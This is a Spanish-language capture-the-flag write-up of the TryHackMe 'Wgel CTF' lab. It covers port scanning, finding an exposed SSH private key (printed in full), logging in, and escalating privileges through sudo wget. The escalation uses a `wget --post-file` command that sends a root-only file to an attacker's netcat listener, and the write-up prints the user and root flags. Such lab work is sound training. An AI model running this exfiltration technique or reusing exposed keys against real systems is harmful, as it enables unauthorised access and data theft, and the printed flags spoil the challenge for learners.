---
tags:
  - web
  - dirsearch
  - ssh
  - id_rsa
  - Nmap
  - Netcat
  - Escalada_Privilegios
  - chmod
  - Data_Exfiltration_HTTP
  - root
---


## Informacion de la maquina

- **Plataforma:** TryHackMe
- **Máquina:** Wgel CTF (nivel **Easy**) 

## Reconocimiento y enumeración web

- Usé `nmap` para escanear puertos abiertos:
```bash
──(zikuta㉿zikuta)-[~]
└─$ nmap -A --top-ports 100 10.10.180.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 02:56 CDT
Nmap scan report for 10.10.180.210
Host is up (0.21s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/12%OT=22%CT=7%CU=44079%PV=Y%DS=2%DC=T%G=Y%TM=684A886
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=106%TI=Z%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=I%
OS:II=I%TS=A)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=1
OS:09%TI=Z%CI=I%II=I%TS=A)OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7
OS:%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W
OS:4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW7%CC=Y%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   240.73 ms 10.23.0.1
2   240.95 ms 10.10.180.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.07 seconds

```

`Resultado: **22/tcp (SSH)** y **80/tcp (HTTP)**`

Navegando al sitio, solo vi la página por defecto de Apache. En el **código fuente** se detectó un comentario: _“Jessie don’t forget to update the website”_, lo cual sugiere que el usuario `jessie` es relevante

## Descubrimiento de directorios ocultos

- Con `dirsearch` /  encontré un directorio `/sitemap/`.
- Profundizando con un wordlist pequeño, apareció `.ssh/` dentro de `/sitemap/` 
- Ahí estaba un archivo `id_rsa`: la clave privada de `jessie`

```bash
─(zikuta㉿zikuta)-[~]
└─$ dirsearch -u http://10.10.180.210/sitemap                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/zikuta/reports/http_10.10.180.210/_sitemap_25-06-12_03-00-17.txt

Target: http://10.10.180.210/

[03:00:17] Starting: sitemap/
[03:00:20] 301 -  319B  - /sitemap/js  ->  http://10.10.180.210/sitemap/js/ 
[03:00:23] 200 -   14KB - /sitemap/.DS_Store                                
[03:00:25] 403 -  278B  - /sitemap/.ht_wsr.txt                              
[03:00:25] 403 -  278B  - /sitemap/.htaccess.bak1                           
[03:00:25] 403 -  278B  - /sitemap/.htaccess.orig
[03:00:25] 403 -  278B  - /sitemap/.htaccess.sample                         
[03:00:25] 403 -  278B  - /sitemap/.htaccess.save                           
[03:00:25] 403 -  278B  - /sitemap/.htaccess_extra                          
[03:00:25] 403 -  278B  - /sitemap/.htaccess_orig
[03:00:25] 403 -  278B  - /sitemap/.htaccess_sc
[03:00:25] 403 -  278B  - /sitemap/.htaccessBAK
[03:00:25] 403 -  278B  - /sitemap/.htaccessOLD
[03:00:25] 403 -  278B  - /sitemap/.htaccessOLD2                            
[03:00:25] 403 -  278B  - /sitemap/.htm                                     
[03:00:25] 403 -  278B  - /sitemap/.html                                    
[03:00:25] 403 -  278B  - /sitemap/.htpasswds                               
[03:00:25] 403 -  278B  - /sitemap/.htpasswd_test
[03:00:26] 403 -  278B  - /sitemap/.httr-oauth                              
[03:00:30] 200 -    2KB - /sitemap/.sass-cache/                             
[03:00:30] 301 -  321B  - /sitemap/.ssh  ->  http://10.10.180.210/sitemap/.ssh/
[03:00:30] 200 -  462B  - /sitemap/.ssh/                                    
[03:00:30] 200 -    2KB - /sitemap/.ssh/id_rsa                              
[03:00:37] 200 -    3KB - /sitemap/about.html  
```

	Clave privada ssh

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```


## Acceso SSH como `jessie`

- Descargué y protejí la clave:
-
```bash
chmod 600 id_rsa
```
### Cambia los permisos del archivo `id_rsa` (una clave privada SSH):

- **`600`** significa:
    
    - **6** para el propietario: lectura (4) + escritura (2) → **r-w-- -- --**
    - **0** para el grupo: sin permisos
    - **0** para otros: sin permisos

### ¿Por qué es necesario?

- OpenSSH **no te deja usar claves privadas** si el archivo tiene permisos muy abiertos (por seguridad).

```bash
(zikuta㉿zikuta)-[~/Desktop]
└─$ ssh jessie@10.10.180.210 -i id_rsa
The authenticity of host '10.10.180.210 (10.10.180.210)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.180.210' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

```

Me conecte exitosamente por ssh y busque la user flag en la Carpeta `Documents`

```bash
cat Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```

# Escalada de Privilegios

Con `sudo -l` vi que `jessie` puede usar `wget` como root **sin contraseña**:

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```

Este hallazgo es crucial, ya que el usuario puede ejecutar el binario `wget` como root sin necesidad de contraseña. Esto nos abre la puerta a una escalada de privilegios creativa, ya que `wget` puede ser usado para **descargar y ejecutar archivos arbitrarios** si lo combinamos correctamente con otros comandos.

Para explotar esto, consultamos [GTFOBins](https://gtfobins.github.io/) buscando “wget”, lo cual nos confirmó que podemos usar la siguiente técnica:

#### Exfiltrando archivos con HTTP POST

`wget` tiene una opción llamada `--post-file`, la cual permite enviar el contenido de un archivo al servidor especificado mediante una solicitud HTTP POST. Dado que podemos ejecutar `wget` como root, también podemos acceder a archivos protegidos, como `/root/root_flag.txt`.

En la máquina atacante, levantamos un listener con `netcat`:

```bash
nc -lvnp 443
```

Luego, en la máquina víctima, ejecutamos el siguiente comando:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<tu_IP>:443
```

#### Resultado

Desde nuestro `netcat`, recibimos la siguiente salida:

```bash
(zikuta㉿zikuta)-[~]
└─$ nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.23.120.245] from (UNKNOWN) [10.10.180.210] 52072
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.23.120.245:4443
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```

Y con eso, **hemos obtenido el flag de root** sin necesidad de establecer una reverse shell como root, aprovechando únicamente los permisos de `sudo` sobre `wget`.